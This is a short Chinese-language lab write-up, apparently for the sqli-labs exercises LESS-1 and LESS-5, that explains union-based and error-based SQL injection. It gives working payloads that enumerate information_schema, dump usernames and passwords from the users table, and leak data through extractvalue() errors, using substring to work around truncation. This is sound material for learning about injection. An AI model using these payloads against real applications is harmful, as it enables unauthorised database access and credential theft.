part-1 union联合注入

LESS-1

通过?id=2-1 显示的是 ?id=2的界面确定是字符型注入

通过?id=2’时页面报错判断 闭合方式为单引号闭合

利用 group by 二分法确定页面数据列数量为3

令id=0,使其不显示第一行的内容

观察回显位,发现2和3可以正常显示出来

将3改为database()

得到数据库名称security

?id=0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = ‘security’–+

?id=0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema =database() and table_name= ‘users’–+

目标为 username 和 password

?id=0’ union select 1,group_concat(‘~’,username,password),3 from users–+

part-2 报错注入

LESS-5

进入题目发现界面只有两种 真和假 , 但页面有回显错误页面,于是使用报错注入

输入?id=1\判断为字符型注入,闭合方式为单引号

通过extractvalue()函数报错注入

?id=1’ union select 1,extractvalue(1,concat(‘~’,(select database()))),3 –+

也可以这么报错

?id=1’ and 1=extractvalue(1,concat(0x7e,(select database()))) –+

?id=1’ and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()))) –+

其余部分与前面题同理

但是发现extractvalue函数报错回显只有32个字符,不能显示完整

使用substring函数解决该问题

substring(1,2,3)

1从哪里查询

2从第几个字符开始

3数多少个字符

多组拼接达到目的
